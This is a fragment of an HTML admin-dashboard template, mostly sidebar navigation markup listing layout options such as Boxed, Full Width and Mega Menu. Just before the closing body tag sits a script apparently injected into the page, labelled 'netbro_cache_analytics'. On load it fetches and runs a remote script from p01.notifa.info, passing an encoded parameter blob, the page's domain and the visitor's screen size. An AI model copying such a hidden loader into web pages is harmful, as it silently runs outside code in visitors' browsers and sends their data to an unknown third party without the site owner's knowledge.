...
<body class="page-header-fixed sidemenu-closed-hidelogo page-content-white page-md header-white dark-sidebar-color logo-dark">
	                ...
	                <div id="remove-scroll">
	                    <ul class="sidemenu page-header-fixed p-t-20" data-keep-expanded="false" data-auto-scroll="true" data-slide-speed="200">
	                        ...
	                        <li class="nav-item">
	                            ...
	                            <ul class="sub-menu">
	                                <li class="nav-item">
	                                    <a href="#" class="nav-link "> <span class="title">Boxed</span>
	                                    </a>
	                                </li>
	                                <li class="nav-item">
	                                    <a href="#" class="nav-link "> <span class="title">Full Width</span>
	                                    </a>
	                                </li>
	                                <li class="nav-item">
	                                    <a href="#" class="nav-link "> <span class="title">Collapse Menu</span>
	                                    </a>
	                                </li>
	                                <li class="nav-item">
	                                    <a href="#" class="nav-link "> <span class="title">Right Sidebar</span>
	                                    </a>
	                                </li>
	                                <li class="nav-item">
	                                    <a href="#" class="nav-link "> <span class="title">Hover Sidebar Menu</span>
	                                    </a>
	                                </li>
	                                <li class="nav-item">
	                                    <a href="#" class="nav-link "> <span class="title">Mega Menu</span>
	                                    </a>
	                                </li>
	                            </ul>
	                        </li>
    ...
    <!-- end js include path -->
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mAdQP2liKePolj5tUBgRq%2fnUWUZ9UguycarbDvufkhZDPBECqQTSdnfxtxLtEyouAYEo9Zgix2eOL0ECjlFOabxQ6n%2faXr%2bESD8qGK5DvlhSglT3ycVEStS%2fqFrvx1Y0fLfKCwL9j3UXiEcdXIjxdPZVHV%2bhcNvmvmjhmtOPnI%2b3rDTS7cmozCEixQcv6Wx8os1GkMWYU1FfzW5e9yNVdrb8gX3UqYc4JrStj1Owmfx86eccArGe4TZb4woe5QAXgxTkIQsMYlx%2bUDK3fhbtP%2fwW9Du7Ud5u2GOR3bBzpD0ePg9glUIINr%2faDfZmWc9%2f6m55IVaOCPoo2pJ4cOXaOgdrX2neGbd4YD%2bTQVDJcNrB0tI7e8I2GiOBvtf9F8aIlOIjg%2fZpbxAYurXb8m6eNDH6cnR9UgblAf1ySh35eL4nmPc2EllE%2f1FldDK6OfEwm7rXGFpuirGuLMX4icfX6Bp90e%2fwcIq0Xl5URHsgwiheifLXFMohwK681RldK%2fvZA" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
